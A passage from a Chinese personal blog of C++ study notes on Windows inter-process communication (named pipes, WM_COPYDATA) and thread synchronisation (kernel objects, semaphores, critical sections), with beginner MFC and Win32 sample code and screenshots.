(<span class="literal">NULL</span> == hEvent)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;创建事件失败&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">OVERLAPPED ovlap;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;ovlap, <span class="built_in">sizeof</span>(OVERLAPPED));</span><br><span class="line">ovlap.hEvent = hEvent;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ConnectNamedPipe</span>(hNamedPipe, &amp;ovlap))&#123;</span><br><span class="line"><span class="keyword">if</span> (ERROR_IO_PENDING != <span class="built_in">GetLastError</span>())&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;等待客户端连接失败&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">hEvent = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE) == WAIT_FAILED)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;等待对象失败&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">hEvent = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建命名管道其实也还好，但是为了一些安全考虑，做了一些措施，本质上都是copy来的。</p><p>至于send和recv其实换汤不换药</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeSerDlg::OnBnClickedSendBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//命名管道 服务端 发送</span></span><br><span class="line"><span class="type">char</span> szBuf[] = <span class="string">&quot;This Named Pipe From Server&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hNamedPipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;WriteFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeSerDlg::OnBnClickedRecvbtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//命名管道 服务端 接收</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hNamedPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;ReadFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//接收后显示出来</span></span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说跟之前的一个模样的~</p><hr><h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hNamedPipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedConnBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//创建命名管道</span></span><br><span class="line">LPCTSTR szPipeName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\pipe\\mypipe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">WaitNamedPipe</span>(szPipeName,NMPWAIT_WAIT_FOREVER))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;当前没有可以利用的管道&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过打开的命名管道返回的句柄传给hNamedPipe</span></span><br><span class="line">hNamedPipe = <span class="built_in">CreateFile</span>(</span><br><span class="line">szPipeName, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line"><span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hNamedPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateFile failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比之下，客户端的连接管道就比较简单了。</p><p>然后接收发送一个样都可以直接拷贝前面的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedSendBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//命名管道 客户端 发送</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = <span class="string">&quot;Named of Pipe Client&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hNamedPipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;WriteFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedRecvBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//命名管道 客户端 接收</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hNamedPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;ReadFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>首先肯定是先编译了。</p><img src="/2022/07/21/process/020.png" class=""><p>可以看到在没有建立管道的时候，点击肯定是报错的。</p><img src="/2022/07/21/process/021.png" class=""><p>老样子，点击建立，然后客户端连接之后</p><p>服务器发送 客户端接收</p><img src="/2022/07/21/process/022.png" class=""><p>客户端发送 服务器接收</p><img src="/2022/07/21/process/023.png" class=""><p>ok没啥问题~<br>除非要考到，不然这玩意我是记不住，看看文档差不多了。</p><hr><h2 id="WM-COPUDATA"><a href="#WM-COPUDATA" class="headerlink" title="WM_COPUDATA"></a>WM_COPUDATA</h2><p><code>wParam</code>传递数据的窗口的句柄</p><p><code>COPYDATASTRUCT</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagCOPYDATASTRUCT</span> &#123;</span><br><span class="line">    ULONG_PTR dwData;</span><br><span class="line">    DWORD cbData;</span><br><span class="line">    _Field_size_bytes_(cbData) PVOID lpData;</span><br><span class="line">&#125; COPYDATASTRUCT, *PCOPYDATASTRUCT;</span><br></pre></td></tr></table></figure><p><code>SPY++</code>工具专门用来查找窗口句柄<br>这玩意内置在vs里面了，在顶部工具栏里面</p><img src="/2022/07/21/process/024.png" class=""><p>打开之后就是这么一个东西</p><p>然后点窗口搜索，它可以拖动到指定的窗口去获取句柄</p><img src="/2022/07/21/process/025.png" class=""><p>这里拖到我们的vs22上面，可以看到能看到标题和句柄。</p><p>拿到这样的句柄之后可以进行通信，不过也要能写代码。不然结构不一样它也没有发送接收什么的。</p><p>这里也直接用上面写的修改一下就行了。<br>客户端发送</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedSendBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//发送端</span></span><br><span class="line">CString strWinTitle = _T(<span class="string">&quot;服务端&quot;</span>);</span><br><span class="line">CString strMsg = _T(<span class="string">&quot;Client COPYDATA&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用标题获取句柄</span></span><br><span class="line">HWND hwnd = ::<span class="built_in">FindWindow</span>(<span class="literal">NULL</span>, strWinTitle.<span class="built_in">GetBuffer</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断句柄有内容还是个窗口</span></span><br><span class="line"><span class="keyword">if</span> (hwnd != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">IsWindow</span>(hwnd))&#123;</span><br><span class="line"><span class="comment">//数据的封装</span></span><br><span class="line">COPYDATASTRUCT cpd;</span><br><span class="line">cpd.dwData = <span class="number">0</span>;</span><br><span class="line">cpd.cbData = strMsg.<span class="built_in">GetLength</span>() * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">cpd.lpData = (PVOID)strMsg.<span class="built_in">GetBuffer</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//1句柄 2消息类型 3主窗口 4copy结构体</span></span><br><span class="line">::<span class="built_in">SendMessage</span>(hwnd, WM_COPYDATA, (WPARAM)(<span class="built_in">AfxGetApp</span>()-&gt;m_pMainWnd),(LPARAM) &amp; cpd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strWinTitle.<span class="built_in">ReleaseBuffer</span>();</span><br><span class="line">strMsg.<span class="built_in">ReleaseBuffer</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端通过wm_copydata自动接收</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CmyNamePipeSerDlg::OnCopyData</span><span class="params">(CWnd *pWnd, COPYDATASTRUCT *pCopyDataStruct)</span></span>&#123;</span><br><span class="line"><span class="comment">//消息响应之后解析</span></span><br><span class="line">LPCTSTR szText = (LPCTSTR)(pCopyDataStruct-&gt;lpData);</span><br><span class="line">DWORD dwLength = (DWORD)pCopyDataStruct-&gt;cbData;</span><br><span class="line">TCHAR szRecvText[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(szRecvText, szText, dwLength);</span><br><span class="line"><span class="built_in">MessageBox</span>(szRecvText, _T(<span class="string">&quot;Y&quot;</span>), MB_OK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CDialogEx::<span class="built_in">OnCopyData</span>(pWnd, pCopyDataStruct);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个框架是通过编译器造的不用自己敲，里面的实现要自己来<br>右击图形界面，找到类向导打开，消息里面搜索然后双击就出来了</p><img src="/2022/07/21/process/026.png" class=""><p>最后跑一下</p><img src="/2022/07/21/process/027.png" class=""><p>当客户端点击发送的时候，服务端此刻不需要点击接收才能收到消息，而是自动的收到了消息。<br>这种方式可能用的会比较多。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>剪切板比较简单，他和匿名管道一样只能实现同一个机器的两个进程通信，不能跨网络。<br>邮槽基于广播，可以一对多发送，但是只能一个发一个收，要同时进行就要多写点代码。邮槽传输的数据量较小，只能是424字节一下。<br>命名管道和邮槽都可以进行网络通信，命名管道是点对点的单一通信。<br>WM_COPYDATA封装数据和解析数据，使用起来也挺方便，不过数据量比较大的话就建议用命名管道。</p><p>说参数是挺无聊的，但是实现一下也还行。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-续</title>
      <link href="/2022/07/20/thread1/"/>
      <url>/2022/07/20/thread1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>加上代码片段，markdown上一篇写的有点长了，自己都不好理了，还是分开写写吧。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h2><ol><li>内核对象<br>windows中的每个内核对象都是一个内存块，它由操作系统内和分配，并且只能由操作系统内核进程访问，应用程序不能在内存中定位这些数据结构并直接更改其内容。这个内存卡本质上是一个数据结构，其成员维护着与对象相关的信息。<br><code>CreateFile</code><br>如file文件对象，event事件对象，process进程，thread线程，iocompletatinport完成端口，mailslot邮槽，mutex互斥量和registry注册表等</li><li>内核对象的使用计数和生命周期<br>因为所有者是操作系统内核，而非进程，所以说当进程退出，内核对象不一定就被销毁。<br>初次创建内核对象，使用计数为1，当另一个进程获得访问权之后，使用计数+1，当使用计数为0，操作系统内核会主动销毁内核对象。</li></ol><img src="/2022/07/20/thread1/000.png" class=""><ol start="3"><li>操作内核对象<br>通过Create之类的函数构建，成功构建后返回句柄，否则返回NULL。<br>在32位进程中，句柄是一个32位值；在64位进程中，句柄则是一个64位值。</li><li>内核对象和其他类型的对象<br>windows除了内核对象还有，窗口、菜单、字体等对象，但这些属于用户对象和GDI对象。要区分内核对象和非内核对象，最简单的方式就是查看创建这个对象的函数，几乎所有创建内核对象的函数都有一个允许我们指定安全属性的参数。</li></ol><p><strong>注：一个对象是不是内核对象，通常可以看创建次对象API的参数中是否需要<code>PSECURITY_ATTRIBUTES</code>类型的参数</strong></p><p>只有内核对象的引用计数为0时才会销毁。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I am comming....&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">HANDLE headle2;</span><br><span class="line">DWORD threadId;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);    <span class="comment">//创建 引用，内核计数位2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);<span class="comment">//关闭线程句柄，内核计数-1</span></span><br><span class="line"></span><br><span class="line">headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line">headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line">headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><p>内核对象的状态：<br>触发状态：有信号状态，表示有可用资源<br>未触发状态：无信号状态，表示没有可用资源</p><ol><li>计数器：该内核对象被使用的次数</li><li>最大资源数量：标识信号量可以控制的最大资源数量(带符号的32位)</li><li>当前资源数量：标识当前可用的资源的数量(带符号的32位)。即表示当前开放资源的个数，注意不是剩下的资源个数。只有开放的资源才能被线程所申请，但开放的资源不一定被线程占用完。<br>比如当前开放5个资源，目前只有3个线程申请，还剩2个可以用。<br>但如果瞬发7个线程就要使用信号量，因为5个开放的资源显然不够用。</li></ol><p>信号量的规则</p><ol><li>如果当前资源计数大于0，那么信号量处于触发状态即有信号状态，表示有可用资源</li><li>如果当前资源计数等于0，那么信号量属于未触发状态即无信号状态，表示没有可用资源</li><li>系统本身绝对不会让当前资源计数变为负数</li><li>当前资源技术也绝对不会大于最大资源计数</li></ol><p><code>CreateSemaphore</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateSemaphoreW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lInitialCount,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lMaximumCount,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpName</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateSemaphore  CreateSemaphoreW</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>文档详解：</p><img src="/2022/07/20/thread1/001.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> HANDLE semOne;</span><br><span class="line"><span class="type">static</span> HANDLE semTwo;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Read</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Input num:&quot;</span>, stdout);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begin read\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待内核对象信号，有信号继续执行没有就等待</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(semTwo, INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begining read\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(semOne, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Accu</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begin Accu\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待内核对象semOne的信号，如果有信号继续执行，反之等待</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(semOne, INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;beginning Accu\n&quot;</span>);</span><br><span class="line">sum += num;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>, sum);</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(semTwo, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result:%d\n&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line">semOne = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//semOne 没有可用资源 只能表示0或1的二进制信号量 无信号</span></span><br><span class="line">semTwo = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//semTwo 有可用资源 有信号状态 有信号</span></span><br><span class="line"></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Read, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Read, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(semOne);</span><br><span class="line"><span class="built_in">CloseHandle</span>(semTwo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/20/thread1/002.png" class=""><img src="/2022/07/20/thread1/003.png" class=""><p>因为semTwo初始有信号，所以线程开始的时候如果先调用Accu就会被卡在Wait那里，如上图2<br>而当线程先跑Read的时候虽然也执行到了scanf，但是由于我们还没有向内存输入，另一个线程Accu也已经先跑了就会看到图1的情况。</p><p>至于后续的结果，也是可以大致猜到的。<br>由于线程运行完之后都有一个重置信号的过程，所以另一个线程等到这个信号就立马执行了，导致控制台看上去有点乱。</p><img src="/2022/07/20/thread1/004.png" class=""><hr><h2 id="关键代码段"><a href="#关键代码段" class="headerlink" title="关键代码段"></a>关键代码段</h2><blockquote><p>前面学的互斥对象、事件对象、信号量这些对象都是属于内核态的线程同步。</p></blockquote><p><code>critical_section</code>关键代码段，也成为临界区，工作在用户方式下。它是指一个小代码段，在代码能够执行钱，他必须独占对某些资源的访问其。通常把多线程中的访问同一种资源的那部分代码当作关键代码段。</p><p><code>InitializeCriticalSection</code>用于初始化一个关键代码段。<br>其原型为：</p><figure class="highlight 